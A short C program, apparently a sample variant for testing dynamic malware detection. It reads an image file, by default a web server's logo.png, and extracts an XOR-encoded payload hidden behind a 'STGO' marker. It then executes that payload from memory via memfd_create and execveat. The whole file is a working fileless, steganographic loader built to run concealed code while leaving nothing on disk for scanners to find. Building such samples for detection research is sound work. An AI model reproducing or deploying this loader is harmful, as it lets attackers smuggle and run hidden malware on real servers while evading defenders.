// Variant C (stego). Read carrier asset -> decode -> memfd_create -> execveat.
// See docs/dynamic-detection.md.
#define _GNU_SOURCE
#include <fcntl.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <sys/mman.h>
#include <sys/syscall.h>

#ifndef AT_EMPTY_PATH
#define AT_EMPTY_PATH 0x1000
#endif

static const unsigned char MAGIC[4] = {'S', 'T', 'G', 'O'};

int main(int argc, char **argv) {
    const char *asset = (argc > 1) ? argv[1]
                                   : "/usr/local/apache2/htdocs/logo.png";

    int fd = open(asset, O_RDONLY);
    if (fd < 0) { perror("open asset"); return 1; }
    off_t sz = lseek(fd, 0, SEEK_END);
    lseek(fd, 0, SEEK_SET);
    unsigned char *buf = malloc(sz);
    if (read(fd, buf, sz) != sz) { perror("read"); return 1; }
    close(fd);

    unsigned char *p = memmem(buf, sz, MAGIC, sizeof MAGIC);
    if (!p) { fprintf(stderr, "no hidden payload in %s\n", asset); return 2; }
    unsigned int len;
    memcpy(&len, p + 4, 4);
    unsigned char *enc = p + 8, *dec = malloc(len);
    for (unsigned int i = 0; i < len; i++)
        dec[i] = enc[i] ^ 0x5A;

    int mfd = memfd_create("x", MFD_CLOEXEC);
    if (mfd < 0) { perror("memfd_create"); return 3; }
    if (write(mfd, dec, len) != (ssize_t)len) { perror("write mfd"); return 3; }

    char *av[] = {"x", NULL}, *ev[] = {NULL};
    syscall(SYS_execveat, mfd, "", av, ev, AT_EMPTY_PATH);
    perror("execveat");
    return 4;
}
